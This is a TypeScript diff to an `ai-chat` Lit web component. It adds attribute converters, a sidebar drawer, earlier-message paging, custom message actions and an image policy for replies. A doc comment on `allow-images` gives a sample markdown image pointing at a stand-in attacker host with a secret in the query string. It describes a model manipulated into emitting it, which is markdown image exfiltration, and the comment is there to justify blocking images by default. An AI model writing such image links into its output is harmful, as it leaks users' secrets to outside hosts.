@@ -8,8 +8,9 @@ import type {
   ChatTransport,
   Role,
   Attachment,
+  MessageAction,
 } from './types.js';
-import { renderMarkdown, StreamingMarkdown } from './markdown/markdown.js';
+import { renderMarkdown, sanitizeIcon, StreamingMarkdown, type ImagePolicy } from './markdown/markdown.js';
 import { chatStyles } from './styles.js';
 import { hljsTheme } from './markdown/hljs-theme.js';
 import { DEFAULT_LABELS, type ChatLabels } from './labels.js';
@@ -25,6 +26,7 @@ import {
   fileIcon,
   copyIcon,
   editIcon,
+  asideIcon,
 } from './icons.js';
 
 let idCounter = 0;
@@ -50,6 +52,18 @@ const nextId = () =>
  *                          component does NOT mutate messages; the consumer owns
  *                          what edit means (truncate-after + resend, etc.).
  */
+/**
+ * Boolean attributes as the docs describe them: absent or `"false"` is off;
+ * present, `""` or `"true"` is on. Lit's stock converter treats ANY present
+ * attribute as true, so `show-timestamps="false"` — the natural way to write it
+ * in an Angular or Vue template — used to switch the feature ON. Reflection is
+ * unchanged: true writes a bare attribute, false removes it.
+ */
+const booleanAttribute = {
+  fromAttribute: (value: string | null): boolean => value !== null && value.trim().toLowerCase() !== 'false',
+  toAttribute: (value: boolean): string | null => (value ? '' : null),
+};
+
 @customElement('ai-chat')
 export class AiChat extends LitElement {
   static override styles = [chatStyles, hljsTheme];
@@ -103,7 +117,7 @@ export class AiChat extends LitElement {
    * Claude style). Set this to wrap them in a bubble like the user's messages.
    * Reflected so the CSS (`:host([assistant-bubble])`) can react. Default: false.
    */
-  @property({ type: Boolean, attribute: 'assistant-bubble', reflect: true })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'assistant-bubble', reflect: true })
   assistantBubble = false;
 
   /**
@@ -112,7 +126,7 @@ export class AiChat extends LitElement {
    * bar with your own markup — the slot wins whether or not this is set.
    * Reflected so CSS (`:host([show-header])`) can react. Default: false.
    */
-  @property({ type: Boolean, attribute: 'show-header', reflect: true })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-header', reflect: true })
   showHeader = false;
 
   /**
@@ -120,7 +134,7 @@ export class AiChat extends LitElement {
    * `show-header` is on, otherwise floating top-right). Calls `clear()`.
    * Default: false.
    */
-  @property({ type: Boolean, attribute: 'show-clear' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-clear' })
   showClear = false;
 
   /**
@@ -128,7 +142,7 @@ export class AiChat extends LitElement {
    * turn. Default: true — it's the expected behavior and costs nothing when
    * there are no errors.
    */
-  @property({ type: Boolean, attribute: 'show-retry' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-retry' })
   showRetry = true;
 
   /**
@@ -136,7 +150,7 @@ export class AiChat extends LitElement {
    * On by default. Set `show-copy="false"` to hide it; the row still renders
    * for any consumer actions slotted via `message-actions-start` / `-end`.
    */
-  @property({ type: Boolean, attribute: 'show-copy' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-copy' })
   showCopy = true;
 
   /**
@@ -146,7 +160,7 @@ export class AiChat extends LitElement {
    * (truncate-after + resend, edit-in-place, branch, ...). The component does not
    * mutate `.messages` itself. No-op on assistant messages.
    */
-  @property({ type: Boolean, attribute: 'show-edit' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-edit' })
   showEdit = false;
 
   /**
@@ -170,7 +184,7 @@ export class AiChat extends LitElement {
    * `stop()` (the Stop button, or Esc) always aborts, because that's the user
    * saying they don't want the reply at all.
    */
-  @property({ type: Boolean, attribute: 'abort-on-switch' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'abort-on-switch' })
   abortOnSwitch = false;
 
   /**
@@ -179,26 +193,47 @@ export class AiChat extends LitElement {
    * unaffected. Fill it via the `aside` slot; drive it with the `ai-chat:new-chat`
    * event and by swapping `.messages`. Reflected for CSS. Default: false.
    */
-  @property({ type: Boolean, attribute: 'show-aside', reflect: true })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-aside', reflect: true })
   showAside = false;
 
   /**
    * Which side the sidebar sits on. Left by default (ChatGPT/Claude style).
    * Reflected so the CSS can flip the layout order. Usage: `aside-side="right"`.
    */
+  /**
+   * Below this width (px) of the chat itself — not the screen — the sidebar
+   * becomes a drawer that slides over the chat, opened by a built-in toggle
+   * (or your own, via `aside-open`). Default 560. `0` never collapses.
+   */
+  @property({ type: Number, attribute: 'aside-breakpoint' })
+  asideBreakpoint = 560;
+
+  /**
+   * Whether the sidebar drawer is open on a narrow chat. Set it to open or
+   * close the drawer from your own button; the component changes it (and fires
+   * `ai-chat:aside-toggle`) when the reader uses the toggle, the backdrop, Esc,
+   * or switches conversation. No effect while the chat is wide.
+   */
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'aside-open', reflect: true })
+  asideOpen = false;
+
+  /** Keep the drawer behaviour but hide the built-in toggle (bring your own trigger). */
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'hide-aside-toggle' })
+  hideAsideToggle = false;
+
   @property({ type: String, attribute: 'aside-side', reflect: true })
   asideSide: 'left' | 'right' = 'left';
 
   /** Show the sender name above each message bubble. Default: true. */
-  @property({ type: Boolean, attribute: 'show-names' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-names' })
   showNames = true;
 
   /** Show a timestamp (e.g. "3:45 PM") next to each message. Default: true. */
-  @property({ type: Boolean, attribute: 'show-timestamps' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'show-timestamps' })
   showTimestamps = true;
 
   /** Disable the whole input surface. */
-  @property({ type: Boolean })
+  @property({ type: Boolean, converter: booleanAttribute })
   disabled = false;
 
   /**
@@ -208,7 +243,7 @@ export class AiChat extends LitElement {
    * built-in adapters; other files still reach the consumer via `ai-chat:submit`.
    * Reflected so CSS (`:host([allow-attachments])`) can react. Default: false.
    */
-  @property({ type: Boolean, attribute: 'allow-attachments', reflect: true })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'allow-attachments', reflect: true })
   allowAttachments = false;
 
   /**
@@ -218,7 +253,7 @@ export class AiChat extends LitElement {
    * you're providing your own trigger via `composer-actions-start`. Only
    * meaningful with `allow-attachments`. Default: false.
    */
-  @property({ type: Boolean, attribute: 'hide-attach-button' })
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'hide-attach-button' })
   hideAttachButton = false;
 
   /**
@@ -241,6 +276,72 @@ export class AiChat extends LitElement {
   @property({ type: Number, attribute: 'max-attachment-size' })
   maxAttachmentSize = 0;
 
+  /**
+   * Render images inside replies. Off by default: a reply is model output, and
+   * an image tag makes the reader's browser fetch its URL the moment it shows —
+   * a model talked into writing `![](https://evil.example/?d=<secret>)` would
+   * send the secret out (markdown image exfiltration). Off, an image renders as
+   * its alt text. Turn on only when replies need pictures, and pair it with
+   * `image-hosts`. Usage: `<ai-chat allow-images image-hosts="https://cdn.example.com/">`.
+   */
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'allow-images' })
+  allowImages = false;
+
+  /**
+   * With `allow-images`, the URL prefixes images may load from — space-separated
+   * in the attribute, an array as a property. Only `https:` URLs ever load.
+   * Empty (default) allows any `https:` image.
+   */
+  @property({
+    attribute: 'image-hosts',
+    converter: {
+      fromAttribute: (value: string | null) => (value ?? '').split(/\s+/).filter(Boolean),
+      toAttribute: (value: readonly string[]) => value.join(' '),
+    },
+  })
+  imageHosts: readonly string[] = [];
+
+  /**
+   * Your own buttons in a message's actions row, beside Copy/Edit — e.g.
+   * "Download as Excel" on an answer that holds a table. Called per message
+   * (settled ones with content); return `[]` for none. Pressing one fires
+   * `ai-chat:message-action` `{ actionId, message, index }`.
+   * Usage: `chat.messageActions = (m) => m.role === 'assistant' ? [{ id: 'xlsx', label: 'Download Excel', icon: '<svg…>' }] : []`.
+   */
+  @property({ attribute: false })
+  messageActions?: (message: ChatMessage) => readonly MessageAction[];
+
+  /**
+   * An image URL for the assistant's avatar on every reply — the simple way to
+   * set one. Wins over an `assistant-avatar` slot. A slot is CLONED into each
+   * message inside the shadow DOM, so a framework component styled by page CSS
+   * renders blank there; a URL never has that problem.
+   */
+  @property({ type: String, attribute: 'assistant-avatar-src' })
+  assistantAvatarSrc = '';
+
+  /** An image URL for the user's avatar on every user message. Wins over a `user-avatar` slot. */
+  @property({ type: String, attribute: 'user-avatar-src' })
+  userAvatarSrc = '';
+
+  /**
+   * There are older messages than the ones in `.messages`. Shows a "Load
+   * earlier messages" control at the top of the list; asking for them fires
+   * `ai-chat:load-earlier`, and you answer with `prependMessages(older)`. The
+   * component never fetches anything — you own the storage and the paging.
+   * Usage: `<ai-chat has-earlier>`; clear it once the oldest message is shown.
+   */
+  @property({ type: Boolean, converter: booleanAttribute, attribute: 'has-earlier' })
+  hasEarlier = false;
+
+  /**
+   * How older messages are asked for when `has-earlier` is set: `'scroll'`
+   * (default) loads as the reader nears the top, with the button as well for
+   * keyboard and screen-reader users; `'button'` loads only on a click.
+   */
+  @property({ type: String, attribute: 'load-earlier' })
+  loadEarlier: 'scroll' | 'button' = 'scroll';
+
   /** The conversation. Bindable and reflected back out via events. */
   @property({ attribute: false })
   messages: ChatMessage[] = [];
@@ -253,6 +354,15 @@ export class AiChat extends LitElement {
   @state() private _dragging = false;
   /** Shown when the user has scrolled up away from the latest message. */
   @state() private _showJump = false;
+  /** The missing-transport warning has been printed for this element. */
+  private _warnedNoTransport = false;
+  /** The chat is narrower than `aside-breakpoint`: the sidebar is a drawer. */
+  @state() private _narrow = false;
+  /** Drawer mode has settled, so opening/closing may animate. Never true on the switch itself. */
+  @state() private _drawerAnimates = false;
+  private _layoutObserver?: ResizeObserver;
+  /** An `ai-chat:load-earlier` is out and its answer hasn't come back yet. */
+  @state() private _loadingEarlier = false;
   /** The image attachment shown in the full-size preview overlay (null = none). */
   @state() private _preview: Attachment | null = null;
   /** id of the user message currently being edited inline (null = none). */
@@ -378,6 +488,17 @@ export class AiChat extends LitElement {
 
   @query('.messages') private _scrollEl!: HTMLElement;
   @query('.scroll-sentinel') private _sentinel!: HTMLElement;
+  @query('.top-sentinel') private _topSentinel?: HTMLElement;
+  @query('.layout') private _layoutEl?: HTMLElement;
+  @query('.aside') private _asideEl?: HTMLElement;
+  @query('.aside-toggle') private _asideToggle?: HTMLButtonElement;
+  @query('.earlier__button') private _earlierButton?: HTMLButtonElement;
+  /** Watches the top of the list so older messages load as the reader nears it. */
+  private _topObserver?: IntersectionObserver;
+  private _observedTop?: Element;
+  /** The first message when older ones were asked for; a different one means the conversation changed. */
+  private _earlierAnchor?: ChatMessage;
+  private _prepending = false;
   @query('textarea') private _textarea!: HTMLTextAreaElement;
   @query('.composer__file') private _fileInput?: HTMLInputElement;
 
@@ -413,7 +534,7 @@ export class AiChat extends LitElement {
     if (m.streaming) {
       let r = this._streamRenderers.get(m.id);
       if (!r) {
-        r = new StreamingMarkdown(this._labels.copy);
+        r = new StreamingMarkdown(this._labels.copy, this._imagePolicy);
         this._streamRenderers.set(m.id, r);
       }
       const { blocks, tail } = r.renderParts(m.content);
@@ -429,7 +550,63 @@ export class AiChat extends LitElement {
     // Settled: render fully once and let the incremental state go. The map
     // stays tiny — it only ever holds messages that are streaming right now.
     this._streamRenderers.delete(m.id);
-    return html`<div class="markdown">${unsafeHTML(renderMarkdown(m.content, this._labels.copy))}</div>`;
+    return html`<div class="markdown">${unsafeHTML(renderMarkdown(m.content, this._labels.copy, this._imagePolicy))}</div>`;
+  }
+
+  private get _imagePolicy(): ImagePolicy {
+    return { allowImages: this.allowImages, imageHosts: this.imageHosts };
+  }
+
+  /**
+   * Every `ai-chat:*` event is also fired as `ai-chat-*` (dash instead of
+   * colon), same detail. Angular reads `(ai-chat:message)` as a global target
+   * like `window:resize` and refuses to compile it; `(ai-chat-message)` binds in
+   * any framework's template. Cancelling either name cancels both.
+   */
+  override dispatchEvent(event: Event): boolean {
+    const allowed = super.dispatchEvent(event);
+    if (!(event instanceof CustomEvent) || !event.type.startsWith('ai-chat:')) return allowed;
+    const alias = new CustomEvent(event.type.replace('ai-chat:', 'ai-chat-'), {
+      detail: event.detail,
+      bubbles: event.bubbles,
+      composed: event.composed,
+      cancelable: event.cancelable,
+    });
+    const aliasAllowed = super.dispatchEvent(alias);
+    // Callers read `event.defaultPrevented` after dispatch; a cancel on the
+    // alias must show there too.
+    if (!aliasAllowed && event.cancelable) event.preventDefault();
+    return allowed && aliasAllowed;
+  }
+
+  private _measureNarrow(): void {
+    const width = this._layoutEl?.getBoundingClientRect().width ?? 0;
+    const narrow = this.showAside && this.asideBreakpoint > 0 && width > 0 && width < this.asideBreakpoint;
+    if (narrow !== this._narrow) {
+      this._narrow = narrow;
+      // Entering drawer mode must not animate the sidebar away (a phone would
+      // see it slide off on every load): enable motion one frame later.
+      this._drawerAnimates = false;
+      if (narrow) requestAnimationFrame(() => requestAnimationFrame(() => (this._drawerAnimates = this._narrow)));
+      // Widening shows the sidebar inline again; an open drawer state would be stale.
+      if (!narrow && this.asideOpen) this._setAsideOpen(false, false);
+    }
+  }
+
+  /** Open or close the drawer; `returnFocus` sends keyboard focus back to the toggle. */
+  private async _setAsideOpen(open: boolean, returnFocus: boolean): Promise<void> {
+    if (this.asideOpen === open) return;
+    this.asideOpen = open;
+    this.dispatchEvent(
+      new CustomEvent('ai-chat:aside-toggle', { detail: { open }, bubbles: true, composed: true }),
+    );
+    await this.updateComplete;
+    if (open) this._asideEl?.focus();
+    else if (returnFocus) this._asideToggle?.focus();
+  }
+
+  private _toggleAside(): void {
+    void this._setAsideOpen(!this.asideOpen, true);
   }
 
   /** Programmatically append a message without sending it. */
@@ -442,6 +619,42 @@ export class AiChat extends LitElement {
     };
     this.messages = [...this.messages, msg];
     return msg;
+  }
+
+  /**
+   * Add older messages ABOVE the conversation — your answer to
+   * `ai-chat:load-earlier`. What the reader is looking at stays exactly where
+   * it is on screen; the new messages appear above it. Call it with `[]` if
+   * nothing came back (or the load failed) so the control is usable again, and
+   * clear `has-earlier` once you've reached the first message.
+   */
+  async prependMessages(older: ChatMessage[]): Promise<void> {
+    const el = this._scrollEl;
+    // Distance from the bottom is what must not change: everything the reader
+    // sees sits below the inserted messages.
+    const fromBottom = el ? el.scrollHeight - el.scrollTop : 0;
+    const hadFocus = this.shadowRoot?.activeElement === this._earlierButton;
+    this._loadingEarlier = false;
+    this._earlierAnchor = undefined;
+    if (older.length > 0) {
+      this._prepending = true;
+      this.messages = [...older, ...this.messages];
+    }
+    await this.updateComplete;
+    this._prepending = false;
+    // Restore the distance from the bottom whatever the pin state says: a reader
+    // at the bottom stays at the bottom, and one reading back keeps their place.
+    // (The pin flag can lag a fast scroll by a frame, so it can't decide this.)
+    if (el && older.length > 0) {
+      el.scrollTop = el.scrollHeight - fromBottom;
+      // Our own scroll must not read as the user scrolling (see _onScroll).
+      this._lastScrollTop = el.scrollTop;
+      this._lastScrollHeight = el.scrollHeight;
+    }
+    // The button can go (no more history) while it holds focus; don't drop
+    // keyboard users onto <body>.
+    if (hadFocus && !this._earlierButton) this._focusComposer();
+    this._recheckTop();
   }
 
   /**
@@ -578,9 +791,14 @@ export class AiChat extends LitElement {
     // caption is a real message). Only the empty-and-attachment-less case bails.
     if ((!text && atts.length === 0) || this._busy) return false;
     if (!this.transport) {
-      this._emitError(
-        'No transport configured. Set the `.transport` property.',
-      );
+      const message = 'No transport configured. Set the `.transport` property.';
+      // The error event alone was invisible: an app that doesn't listen saw a
+      // send button do nothing at all. Say it in the console once per element.
+      if (!this._warnedNoTransport) {
+        this._warnedNoTransport = true;
+        console.warn(`<ai-chat>: ${message} Nothing was sent. See the README's "Transports" section.`);
+      }
+      this._emitError(message);
       return false;
     }
 
@@ -1061,6 +1279,12 @@ export class AiChat extends LitElement {
   }
 
   protected override firstUpdated(): void {
+    // The drawer follows the CHAT's width, not the screen's: a chat in a narrow
+    // panel on a wide screen needs it just as much as one on a phone.
+    if ('ResizeObserver' in window && this._layoutEl) {
+      this._layoutObserver = new ResizeObserver(() => this._measureNarrow());
+      this._layoutObserver.observe(this._layoutEl);
+    }
     // Watch a sentinel at the bottom of the scroller. When it's visible the user
     // is at (or effectively at) the bottom, so we keep following new content;
     // when it scrolls out of view (user scrolled up, or content grew past it) we
@@ -1077,13 +1301,64 @@ export class AiChat extends LitElement {
         { root: this._scrollEl, threshold: 0 },
       );
       if (this._sentinel) this._bottomObserver.observe(this._sentinel);
+      // Older messages start loading a little before the top comes into view,
+      // so a reader scrolling up rarely has to wait at the edge.
+      this._topObserver = new IntersectionObserver(
+        (entries) => {
+          if (entries.some((e) => e.isIntersecting)) this._autoLoadEarlier();
+        },
+        { root: this._scrollEl, rootMargin: '200px 0px 0px 0px', threshold: 0 },
+      );
     }
+  }
+
+  /** The top came into view: ask for older messages, if the reader is actually reading back. */
+  private _autoLoadEarlier(): void {
+    if (this.loadEarlier !== 'scroll') return;
+    const el = this._scrollEl;
+    // A long conversation opens pinned to the bottom with its top momentarily
+    // in view before the first scroll lands; that is not the reader going back.
+    // A short one that doesn't fill the view is: load until it does.
+    const overflows = el ? el.scrollHeight > el.clientHeight : false;
+    if (this._stickToBottom && overflows) return;
+    this._requestEarlier();
+  }
+
+  /** Fire `ai-chat:load-earlier` once; the next waits for `prependMessages()`. */
+  private _requestEarlier(): void {
+    if (!this.hasEarlier || this._loadingEarlier || this.messages.length === 0) return;
+    this._loadingEarlier = true;
+    this._earlierAnchor = this.messages[0];
+    this.dispatchEvent(
+      new CustomEvent('ai-chat:load-earlier', {
+        detail: { conversationId: this.conversationId ?? null, oldest: this.messages[0] },
+        bubbles: true,
+        composed: true,
+      }),
+    );
+  }
+
+  /**
+   * Observe the top sentinel afresh: IntersectionObserver only reports CHANGES,
+   * so a sentinel still in view after a load (the history is still too short to
+   * fill the view) would otherwise never ask for the next page.
+   */
+  private _recheckTop(): void {
+    if (!this._topObserver) return;
+    if (this._observedTop) this._topObserver.unobserve(this._observedTop);
+    this._observedTop = this._topSentinel ?? undefined;
+    if (this._observedTop) this._topObserver.observe(this._observedTop);
   }
 
   override disconnectedCallback(): void {
     document.removeEventListener('keydown', this._onHostKeydown);
     this._bottomObserver?.disconnect();
     this._bottomObserver = undefined;
+    this._topObserver?.disconnect();
+    this._topObserver = undefined;
+    this._layoutObserver?.disconnect();
+    this._layoutObserver = undefined;
+    this._observedTop = undefined;
     // A background stream outlives the conversation it started in, but it must
     // not outlive the ELEMENT — nobody is listening for its events any more, so
     // letting it run would just burn tokens. Cancel every detached request.
@@ -1100,6 +1375,11 @@ export class AiChat extends LitElement {
     if (this._preview) {
       e.preventDefault();
       this._closePreview();
+      return;
+    }
+    if (this._narrow && this.asideOpen) {
+      e.preventDefault();
+      this._setAsideOpen(false, true);
       return;
     }
     if (this._busy) {
@@ -1181,9 +1461,14 @@ export class AiChat extends LitElement {
     // from post-append geometry here, because appended content grows scrollHeight
     // before scrollTop catches up, which would read as "not at bottom" and stop
     // following mid-stream.
-    if (changed.has('messages') && this._stickToBottom) {
+    // Older messages added above never move the reader (prependMessages keeps
+    // their place itself).
+    if (changed.has('messages') && this._stickToBottom && !this._prepending) {
       this._scrollToBottom();
     }
+
+    // The top sentinel comes and goes with `has-earlier`; keep it observed.
+    if ((this._topSentinel ?? undefined) !== this._observedTop) this._recheckTop();
 
   }
 
@@ -1198,6 +1483,21 @@ export class AiChat extends LitElement {
    * the render, instead of scheduling a second one.
    */
   protected override willUpdate(changed: PropertyValues): void {
+    // Picking a conversation in the drawer is the reader done with it.
+    if (changed.has('conversationId') && changed.get('conversationId') !== undefined && this._narrow && this.asideOpen) {
+      void this._setAsideOpen(false, false);
+    }
+    if (changed.has('asideBreakpoint') || changed.has('showAside')) queueMicrotask(() => this._measureNarrow());
+    // A load that was out for a conversation no longer on screen will never be
+    // answered here; free the control for the one that is.
+    if (
+      this._loadingEarlier &&
+      !this._prepending &&
+      (changed.has('conversationId') || (changed.has('messages') && this.messages[0] !== this._earlierAnchor))
+    ) {
+      this._loadingEarlier = false;
+      this._earlierAnchor = undefined;
+    }
     if (this.abortOnSwitch) return;
     if (!changed.has('messages') && !changed.has('conversationId')) return;
 
@@ -1278,8 +1578,11 @@ export class AiChat extends LitElement {
     // unaffected. Structure mirrors ChatGPT/Claude: a fixed top holding the
     // full-width New-chat button, then the consumer's scrolling conversation
     // list in the `aside` slot (see the `new-chat` event + README history pattern).
+    const drawer = this.showAside && this._narrow;
     const aside = this.showAside
-      ? html`<aside class="aside" part="aside">
+      ? html`<aside class="aside ${drawer && this.asideOpen ? 'aside--open' : ''}" part="aside"
+                    id="ai-chat-aside" tabindex="-1"
+                    aria-hidden=${drawer && !this.asideOpen ? 'true' : 'false'}>
           ${
             this.showClear
               ? html`<div class="aside__top">${this._renderNewChatButton('block')}</div>`
@@ -1290,8 +1593,14 @@ export class AiChat extends LitElement {
       : nothing;
     return html`
       ${this._renderAvatarSources()}
-      <div class="layout" part="layout">
+      <div class="layout ${drawer ? 'layout--narrow' : ''} ${drawer && this._drawerAnimates ? 'layout--animate' : ''}" part="layout">
         ${aside}
+        ${
+          drawer && this.asideOpen
+            ? html`<div class="aside-scrim" part="aside-scrim" aria-hidden="true"
+                        @click=${() => this._setAsideOpen(false, true)}></div>`
+            : nothing
+        }
         <div class="root" part="root">
           ${this._renderHeader()}
           <div class="scroll-region">
@@ -1302,6 +1611,7 @@ export class AiChat extends LitElement {
             <div class="messages" part="messages"
                  @click=${this._onMessagesClick} @scroll=${this._onScroll}
                  role="log" aria-label=${this._labels.messagesRegion}>
+              ${hasMessages && this.hasEarlier ? this._renderEarlier() : nothing}
               ${hasMessages ? this._renderMessages() : this._renderEmpty()}
               <!-- Bottom sentinel watched by the IntersectionObserver to decide
                    whether we're pinned to the bottom (see firstUpdated). Only
@@ -1344,8 +1654,10 @@ export class AiChat extends LitElement {
   private _renderHeader() {
     // Button belongs in the header only when there's no sidebar to hold it.
     const clearInHeader = this.showClear && !this.showAside;
+    const toggle = this.showAside && this._narrow && !this.hideAsideToggle;
     const builtIn = this.showHeader
       ? html`<div class="header" part="header">
+          ${toggle ? this._renderAsideToggle() : nothing}
           <span class="header__title" part="header-title">${this._labels.headerTitle}</span>
           ${clearInHeader ? this._renderNewChatButton('icon') : nothing}
         </div>`
@@ -1360,7 +1672,22 @@ export class AiChat extends LitElement {
         clearInHeader && !this.showHeader
           ? html`<div class="clear-float">${this._renderNewChatButton('icon')}</div>`
           : nothing
+      }
+      ${
+        toggle && (!this.showHeader || slottedHeader)
+          ? html`<div class="aside-toggle-float">${this._renderAsideToggle()}</div>`
+          : nothing
       }`;
+  }
+
+  /** Opens/closes the history drawer on a narrow chat. */
+  private _renderAsideToggle() {
+    const label = this.asideOpen ? this._labels.closeAside : this._labels.openAside;
+    return html`<button class="aside-toggle clear-btn" part="aside-toggle" type="button"
+        aria-label=${label} title=${label} aria-expanded=${this.asideOpen ? 'true' : 'false'}
+        aria-controls="ai-chat-aside" @click=${this._toggleAside}>
+        <slot name="aside-toggle-icon">${asideIcon}</slot>
+      </button>`;
   }
 
   /**
@@ -1486,6 +1813,19 @@ export class AiChat extends LitElement {
     `;
   }
 
+  /** The top of a conversation with older history: the trigger, and the sentinel that loads on scroll. */
+  private _renderEarlier() {
+    const loading = this._loadingEarlier;
+    return html`<div class="earlier" part="load-earlier-row">
+      <div class="top-sentinel" aria-hidden="true"></div>
+      <button class="earlier__button" part="load-earlier" type="button"
+              ?disabled=${loading} aria-busy=${loading ? 'true' : 'false'}
+              @click=${this._requestEarlier}>
+        ${loading ? this._labels.loadingEarlier : this._labels.loadEarlier}
+      </button>
+    </div>`;
+  }
+
   private _renderMessages() {
     return repeat(
       this.messages,
@@ -1510,9 +1850,13 @@ export class AiChat extends LitElement {
     // projected light-DOM nodes never become children of <slot>, so a
     // `:has(slot > *)` rule never matches — hence the JS check below.
     const avatarSlot = isAssistant ? 'assistant-avatar' : 'user-avatar';
-    const hasAvatar = this._hasSlotted(avatarSlot);
-    // A clone, not a <slot>: one slotted node can't project into every message.
-    const avatar = this._avatarClone(avatarSlot);
+    const avatarSrc = isAssistant ? this.assistantAvatarSrc : this.userAvatarSrc;
+    const hasAvatar = Boolean(avatarSrc) || this._hasSlotted(avatarSlot);
+    // A URL is a plain <img>; a slot is cloned, not projected — one slotted
+    // node can't project into every message.
+    const avatar = avatarSrc
+      ? html`<img src=${avatarSrc} alt="" decoding="async">`
+      : this._avatarClone(avatarSlot);
     const name = isAssistant
       ? this._labels.assistantName
       : this._labels.userName;
@@ -1632,7 +1976,8 @@ export class AiChat extends LitElement {
     const isUser = m.role === 'user';
     const showCopy = this.showCopy;
     const showEdit = this.showEdit && isUser;
-    if (!showCopy && !showEdit) return nothing;
+    const custom = this._customActions(m);
+    if (!showCopy && !showEdit && custom.length === 0) return nothing;
     return html`
       <div class="message__actions" part="message-actions" role="group"
            aria-label=${this._labels.copyMessage}>
@@ -1656,8 +2001,39 @@ export class AiChat extends LitElement {
                    </button>`
             : nothing
         }
+        ${custom.map(
+          (a) => html`<button class="message__action ${a.icon ? '' : 'message__action--text'}"
+                       part="action-button custom-action" type="button"
+                       data-action=${a.id} title=${a.label} aria-label=${a.label}
+                       ?disabled=${a.disabled ?? false}
+                       @click=${() => this._onCustomAction(a, m)}>
+                       ${a.icon ? unsafeHTML(sanitizeIcon(a.icon)) : a.label}
+                     </button>`,
+        )}
       </div>
     `;
+  }
+
+  /** The app's actions for one message; a throwing or malformed callback shows none. */
+  private _customActions(m: ChatMessage): readonly MessageAction[] {
+    if (!this.messageActions) return [];
+    try {
+      const list = this.messageActions(m);
+      return Array.isArray(list) ? list.filter((a) => a && typeof a.id === 'string' && typeof a.label === 'string') : [];
+    } catch (error) {
+      console.error('<ai-chat>: messageActions threw for a message; showing none.', error);
+      return [];
+    }
+  }
+
+  private _onCustomAction(action: MessageAction, message: ChatMessage): void {
+    this.dispatchEvent(
+      new CustomEvent('ai-chat:message-action', {
+        detail: { actionId: action.id, message, index: this.messages.indexOf(message) },
+        bubbles: true,
+        composed: true,
+      }),
+    );
   }
 
   /** Begin editing a user message (implemented in the edit slice). */
